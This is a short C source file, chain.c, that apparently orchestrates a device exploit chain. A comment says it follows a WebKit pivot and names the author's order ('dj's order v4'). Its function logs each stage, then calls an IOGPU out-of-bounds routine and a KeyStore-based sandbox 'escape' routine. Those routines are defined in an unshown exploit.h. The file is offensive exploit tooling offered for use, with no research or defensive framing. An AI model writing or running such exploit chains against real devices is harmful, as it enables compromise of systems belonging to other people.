/* chain.c — dj's order v4: WebKit pivot completes FIRST (auto, fired by
   the UIBridge gate on "RECON COMPLETE" only). Then this chain runs:
   (1) IOGPU OOB 24257 struct sweep, (2) escape attempt = KeyStore s17/s35.
   Race lane REMOVED per dj — not part of the chain. Continuous log. */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[gen] chain start cause (see GEN line in trace.log)");
    nk_log("[gen] stage 0: IOGPU OOB 24257");
    nk_iogpu_oob_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 0 done -> stage 1: escape (KeyStore s17/s35)");
    nk_ksmagic_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] chain end");
    nk_filelog_close();
}
